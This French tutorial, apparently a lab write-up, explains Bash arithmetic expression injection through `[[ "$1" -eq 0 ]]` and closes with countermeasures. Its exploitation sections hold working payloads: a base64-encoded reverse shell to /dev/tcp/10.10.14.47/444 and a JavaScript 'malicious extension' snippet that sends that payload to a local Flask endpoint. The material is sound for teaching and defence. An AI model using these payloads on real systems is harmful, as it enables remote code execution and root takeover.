# FAILLE BASH ARITHMETIC EXPRESSION INJECTION

## <mark style="color:red;">**FAILLE BASH ARITHMETIC EXPRESSION INJECTION**</mark>

***

### <mark style="color:blue;">**1. LE CONTEXTE**</mark>

#### **Code vulnérable dans `routines.sh` :**

```bash
#!/bin/bash
if [[ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
  find "$TMP_DIR" -type f -name "*.tmp" -delete
  log_action "Routine 0: Temporary files cleaned."
  echo "Temporary files cleaned."
fi
```

**La ligne problématique :**

```bash
if [[ "$1" -eq 0 ]]; then
```

***

### <mark style="color:blue;">**2. POURQUOI C'EST VULNÉRABLE ?**</mark>

#### **2.1 Comportement Normal Attendu**

On pourrait penser que cette ligne fait simplement :

* Prend la valeur de `$1` (premier argument)
* Compare si elle est égale à 0
* Si oui, exécute le code

**Exemple normal :**

```bash
./routines.sh 0    # → Vrai, exécute le code
./routines.sh 5    # → Faux, n'exécute pas
./routines.sh abc  # → Erreur ou faux
```

***

#### **2.2 Le Vrai Comportement de Bash**

**🔥 CRITICAL : Bash ne traite PAS `$1` comme une simple chaîne de caractères !**

Quand Bash voit l'opérateur arithmétique `-eq`, il **évalue l'opérande comme une EXPRESSION ARITHMÉTIQUE**.

***

### <mark style="color:blue;">**3. QU'EST-CE QU'UNE EXPRESSION ARITHMÉTIQUE EN BASH ?**</mark>

#### **3.1 Définition**

Une expression arithmétique en Bash peut contenir :

* Des nombres : `42`, `100`
* Des opérateurs : `+`, `-`, `*`, `/`, `%`
* Des variables : `a`, `x`, `count`
* Des **assignations** : `a=10`, `x+=5`
* Des **tableaux** : `array[0]`, `data[index]`
* Des **substitutions de commandes** : `$(command)`

#### **3.2 Exemples d'Expressions Arithmétiques Valides**

```bash
# Simple
[[ 5 -eq 5 ]]           # Vrai

# Variables
a=10
[[ a -eq 10 ]]          # Vrai (Bash évalue "a" → 10)

# Opérations
[[ 2+3 -eq 5 ]]         # Vrai (Bash calcule 2+3 = 5)

# Assignation
[[ a=20 -eq 20 ]]       # Vrai ET a devient 20 !

# Tableaux
[[ array[0] -eq 5 ]]    # Vrai si array[0] vaut 5
```

***

### <mark style="color:blue;">**4. EXPLOITATION : TABLEAUX ET SUBSTITUTION DE COMMANDES**</mark>

#### **4.1 Les Tableaux en Bash**

Syntaxe d'un tableau :

```bash
nom_tableau[indice]=valeur
```

**Exemples :**

```bash
data[0]=100      # data[0] = 100
data[1]=200      # data[1] = 200
result[5]=999    # result[5] = 999
```

**Point crucial : L'indice peut être une EXPRESSION**

```bash
data[2+3]=100           # data[5] = 100 (car 2+3=5)
data[x]=50              # Si x=3, alors data[3] = 50
```

***

#### **4.2 Substitution de Commandes dans les Indices**

**Bash permet :**

```bash
data[$(echo 0)]=100
```

**Ce qui se passe :**

1. Bash voit `data[...]`
2. Il évalue le contenu des crochets `[...]`
3. Il exécute d'abord `$(echo 0)` → résultat : `0`
4. Puis fait `data[0]=100`

**Exemple concret :**

```bash
#!/bin/bash
array[$(whoami)]=42
echo "Done"
```

**Exécution :**

```bash
$ ./test.sh
kali        # ← whoami s'est exécuté !
Done
```

***

#### **4.3 Pourquoi ça Fonctionne dans `-eq` ?**

Quand on écrit :

```bash
if [[ "$1" -eq 0 ]]; then
```

**Et que `$1` contient :**

```bash
a[$(whoami)]
```

**Bash interprète :**

```bash
if [[ a[$(whoami)] -eq 0 ]]; then
```

**Étapes d'évaluation :**

1. Bash voit `-eq` → mode "expression arithmétique"
2. Il évalue `a[$(whoami)]`
3. Comme c'est une syntaxe de tableau valide, il évalue l'indice
4. `$(whoami)` **s'exécute** → retourne "larry" (ou root si sudo)
5. Bash essaie alors de comparer `a[larry]` avec 0
6. `a[larry]` n'existe pas → vaut 0 par défaut
7. `0 -eq 0` → Vrai

**Résultat : La commande `whoami` a été exécutée !**

***

### <mark style="color:blue;">**5. POURQUOI**</mark><mark style="color:blue;">**&#x20;**</mark><mark style="color:blue;">**`a[...]`**</mark><mark style="color:blue;">**&#x20;**</mark><mark style="color:blue;">**ET PAS JUSTE**</mark><mark style="color:blue;">**&#x20;**</mark><mark style="color:blue;">**`[...]`**</mark><mark style="color:blue;">**&#x20;**</mark><mark style="color:blue;">**?**</mark>

#### **5.1 Test sans le préfixe `a`**

```bash
#!/bin/bash
if [[ "$1" -eq 0 ]]; then
    echo "OK"
fi
```

**Essai :**

```bash
$ ./test.sh '[$(whoami)]'
bash: [[: [larry]: syntax error in expression (error token is "larry")
```

**❌ Erreur syntaxique !**

***

#### **5.2 Avec le préfixe `a`**

```bash
$ ./test.sh 'a[$(whoami)]'
larry        # ← whoami s'exécute !
OK
```

**✅ Fonctionne !**

***

#### **5.3 Explication**

**Sans `a` :**

* Bash voit `[$(whoami)]`
* Ce n'est PAS une syntaxe arithmétique valide
* Les crochets seuls ne signifient rien en arithmétique
* **Erreur de syntaxe**

**Avec `a` :**

* Bash voit `a[$(whoami)]`
* Reconnaît la syntaxe de tableau : `nom[indice]`
* Évalue l'indice → exécute `$(whoami)`
* **Syntaxe valide, commande exécutée**

**Le `a` est juste un nom de tableau fictif, il pourrait être n'importe quoi :**

```bash
x[$(whoami)]      # ✅ Fonctionne
foo[$(whoami)]    # ✅ Fonctionne
bar[$(whoami)]    # ✅ Fonctionne
```

***

### <mark style="color:blue;">**6. EXPLOITATION COMPLÈTE ÉTAPE PAR ÉTAPE**</mark>

#### **6.1 Payload Simple : Preuve de Concept**

**Objectif :** Prouver qu'on peut exécuter `whoami`

**Payload :**

```bash
a[$(whoami>&2)]
```

**Explication :**

* `$(whoami>&2)` : Exécute `whoami` et redirige vers stderr
* `>&2` : Pour que le résultat s'affiche (sinon il serait utilisé comme indice)

**Test local :**

```bash
#!/bin/bash
if [[ "$1" -eq 0 ]]; then
    echo "Routine 0"
fi
```

```bash
$ ./routines.sh 'a[$(whoami>&2)]'
kali        # ← Preuve que whoami s'est exécuté
```

**Avec sudo :**

```bash
$ sudo ./routines.sh 'a[$(whoami>&2)]'
root        # ← S'exécute en tant que root !
```

***

#### **6.2 Payload Avancé : Reverse Shell**

**Problème :** Comment obtenir un shell interactif ?

**Solution :** Redirection TCP avec `/dev/tcp`

**Commande directe :**

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.47/444 0>&1'
```

**Problème avec les caractères spéciaux :**

* Espaces :
* Guillemets : `'`, `"`
* Points-virgules : `;`
* Pipes : `|`
* Redirections : `>`, `<`, `&`

**Ces caractères peuvent casser le payload ou être filtrés.**

***

#### **6.3 Encodage en Base64**

**Solution :** Encoder la commande en base64

```bash
# Commande originale
bash -c 'bash -i >& /dev/tcp/10.10.14.47/444 0>&1'

# En base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ny80NDQgMD4mMSc=
```

**Décodage et exécution :**

```bash
echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ny80NDQgMD4mMSc= | base64 -d | bash
```

**Payload final :**

```bash
a[$(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ny80NDQgMD4mMSc=|base64 -d|bash)]
```

***

### <mark style="color:blue;">**7. DÉROULEMENT COMPLET DE L'EXPLOITATION**</mark>

#### **7.1 Depuis JavaScript (Extension Malveillante)**

```javascript
const TARGET = "http://127.0.0.1:5000/routines/";
const ATTACKER = "10.10.14.47";
const PORT = "444";

// 1. Créer la commande reverse shell
const cmd = `bash -c 'bash -i >& /dev/tcp/${ATTACKER}/${PORT} 0>&1'`;

// 2. Encoder en base64
const b64 = btoa(cmd);
// Résultat : "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ny80NDQgMD4mMSc="

// 3. Construire le payload arithmétique
const exploit = `a[$(echo ${b64}|base64 -d|bash)]`;

// 4. Envoyer la requête
fetch(TARGET + exploit, { mode: "no-cors" });
```

***

#### **7.2 Requête HTTP Envoyée**

```http
GET /routines/a[$(echo%20YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ny80NDQgMD4mMSc=|base64%20-d|bash)] HTTP/1.1
Host: 127.0.0.1:5000
```

***

#### **7.3 Traitement côté Serveur**

**1. Flask reçoit la requête :**

```python
@app.route('/routines/<rid>')
def routines(rid):
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"
```

**2. Flask extrait `rid` :**

```python
rid = "a[$(echo YmFz...|base64 -d|bash)]"
```

**3. Flask exécute :**

```python
subprocess.run(["./routines.sh", "a[$(echo YmFz...|base64 -d|bash)]"])
```

**4. Bash reçoit l'argument :**

```bash
$1 = "a[$(echo YmFz...|base64 -d|bash)]"
```

**5. Script évalue la condition :**

```bash
if [[ "$1" -eq 0 ]]; then
# Devient :
if [[ "a[$(echo YmFz...|base64 -d|bash)]" -eq 0 ]]; then
```

***

#### **7.4 Évaluation Arithmétique par Bash**

**Étape 1 : Bash reconnaît `a[...]` comme un tableau**

```
Expression : a[$(echo YmFz...|base64 -d|bash)]
             ↑                                ↑
           Tableau                         Indice
```

**Étape 2 : Évaluation de l'indice**

```bash
Indice : $(echo YmFz...|base64 -d|bash)
```

**Étape 3 : Substitution de commande `$(...)`**

```bash
1. echo YmFz...           → Affiche la chaîne base64
2. |                      → Pipe
3. base64 -d              → Décode : "bash -c 'bash -i >& /dev/tcp/...'"
4. |                      → Pipe
5. bash                   → Exécute la commande !
```

**Étape 4 : Reverse shell établi**

```bash
bash -i >& /dev/tcp/10.10.14.47/444 0>&1
```

* Ouvre une connexion TCP vers 10.10.14.47:444
* Redirige stdin/stdout/stderr vers cette connexion
* Shell interactif établi !

***

### <mark style="color:blue;">**8. POURQUOI C'EST SI DANGEREUX ?**</mark>

#### **8.1 Contournement de subprocess.run()**

Python utilise :

```python
subprocess.run(["./routines.sh", rid])
```

**Sécurité normale :**

* Pas de `shell=True` → Pas d'interprétation shell
* Liste d'arguments → Pas d'injection de commandes classique

**Mais :**

* L'argument est QUAND MÊME passé à un script bash
* Bash évalue l'arithmétique MÊME si appelé sans shell Python
* **L'injection se fait au niveau Bash, pas Python**

***

#### **8.2 Absence de Validation**

Le code ne valide PAS `$1` :

```bash
if [[ "$1" -eq 0 ]]; then  # ← Aucun filtrage !
```

**Aucune vérification :**

* Pas de regex : `[[ $1 =~ ^[0-9]+$ ]]`
* Pas de sanitisation
* Confiance aveugle dans l'input

***

#### **8.3 Exécution en Contexte Privilégié**

Si le script tourne avec `sudo` ou en tant que root :

```bash
sudo ./routines.sh 'a[$(whoami)]'
```

**Résultat :**

* `whoami` s'exécute en tant que **root**
* Toutes les commandes injectées ont les privilèges root
* Accès complet au système

***

### <mark style="color:blue;">**9. CONTRE-MESURES**</mark>

#### **9.1 Validation Stricte avec Regex**

```bash
#!/bin/bash

# Valider que $1 est un nombre
if ! [[ "$1" =~ ^[0-9]+$ ]]; then
    echo "Error: Invalid input"
    exit 1
fi

# Maintenant sûr d'utiliser -eq
if [[ "$1" -eq 0 ]]; then
    echo "Routine 0"
fi
```

**L'opérateur `=~` ne fait PAS d'évaluation arithmétique !**

***

#### **9.2 Utiliser `[ ]` au lieu de `[[ ]]`**

```bash
#!/bin/bash
if [ "$1" -eq 0 ]; then
    echo "Routine 0"
fi
```

**Différence :**

* `[ ]` : Commande externe `/usr/bin/[`
* `[[ ]]` : Builtin bash avec évaluation arithmétique

**Test :**

```bash
$ ./test.sh 'a[$(whoami)]'
./test.sh: line 2: [: a[larry]: integer expression expected
```

**✅ Erreur mais pas d'exécution de commande !**

***

#### **9.3 Éviter les Opérateurs Arithmétiques**

**Au lieu de :**

```bash
if [[ "$1" -eq 0 ]]; then
```

**Utiliser des comparaisons de chaînes :**

```bash
if [[ "$1" == "0" ]]; then
```

***

#### **9.4 Ne JAMAIS Faire Confiance aux Inputs Externes**

**Principe fondamental :**

* Tout input utilisateur est **malveillant par défaut**
* Valider avec whitelist, pas blacklist
* Échapper/sanitiser avant utilisation

***

### **10. RÉSUMÉ TECHNIQUE**

#### **Chaîne d'Exploitation :**

```
1. Input utilisateur non validé
   ↓
2. Passé à opérateur arithmétique -eq
   ↓
3. Bash évalue comme expression arithmétique
   ↓
4. Reconnaissance de syntaxe tableau a[...]
   ↓
5. Évaluation de l'indice [...]
   ↓
6. Substitution de commande $(...)
   ↓
7. Exécution de code arbitraire
   ↓
8. Reverse shell / Escalade de privilèges
```

#### **Syntaxes Vulnérables :**

| Syntaxe             | Vulnérable ? | Raison                             |
| ------------------- | ------------ | ---------------------------------- |
| `[[ $var -eq N ]]`  | ✅ Oui        | Évaluation arithmétique            |
| `[[ $var -lt N ]]`  | ✅ Oui        | Évaluation arithmétique            |
| `[[ $var -gt N ]]`  | ✅ Oui        | Évaluation arithmétique            |
| `$(( $var ))`       | ✅ Oui        | Expression arithmétique explicite  |
| `let var=$input`    | ✅ Oui        | Évaluation arithmétique            |
| `[ $var -eq N ]`    | ❌ Non        | Commande externe, pas d'évaluation |
| `[[ $var == "N" ]]` | ❌ Non        | Comparaison de chaînes             |

***

Voilà l'explication complète et détaillée de cette faille arithmétique ! 🎯
